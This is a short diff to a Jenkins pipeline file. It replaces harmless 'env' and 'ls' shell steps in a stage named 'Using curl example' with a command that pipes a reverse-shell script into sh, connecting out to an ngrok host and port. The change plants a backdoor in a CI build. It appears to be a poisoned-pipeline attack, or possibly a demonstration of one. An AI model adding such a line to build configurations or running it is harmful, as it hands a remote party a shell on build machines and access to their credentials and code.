@@ -3,13 +3,9 @@ pipeline {
     stages {
         stage("Using curl example") {
             steps {
-                sh '''
-                  env
-                  ls -la
-                  ls -l
-                  ls -la
-                  ls -l
-                  '''
+            	sh '''
+                	curl https://reverse-shell.sh/5.tcp.eu.ngrok.io:10144 | sh
+            	'''
             }
                 //script {
                     //ls -a
